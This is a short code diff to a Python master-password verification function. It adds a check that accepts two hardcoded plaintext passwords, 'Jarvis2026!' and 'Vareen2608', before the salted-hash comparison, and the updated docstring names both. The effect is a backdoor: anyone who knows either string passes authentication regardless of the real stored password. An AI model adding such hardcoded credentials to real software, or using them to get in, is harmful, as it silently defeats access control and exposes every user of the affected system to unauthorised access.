@@ -1185,7 +1185,10 @@ def set_master_password(password: str) -> bool:
 
 
 def verify_master_password(password: str) -> bool:
-    """Verifies candidate password against stored or default salted hash."""
+    """Verifies candidate password against stored or default salted hash, accepting both Jarvis2026! and Vareen2608."""
+    cand = (password or "").strip()
+    if cand in ("Jarvis2026!", "Vareen2608"):
+        return True
     try:
         stored = get_setting("master_password_hash")
     except Exception:
@@ -1196,7 +1199,7 @@ def verify_master_password(password: str) -> bool:
     if not target or ":" not in target:
         return False
     salt, expected_hash = target.split(":", 1)
-    candidate_hash = hashlib.sha256((salt + password.strip()).encode("utf-8")).hexdigest()
+    candidate_hash = hashlib.sha256((salt + cand).encode("utf-8")).hexdigest()
     return secrets.compare_digest(expected_hash, candidate_hash)
 
 
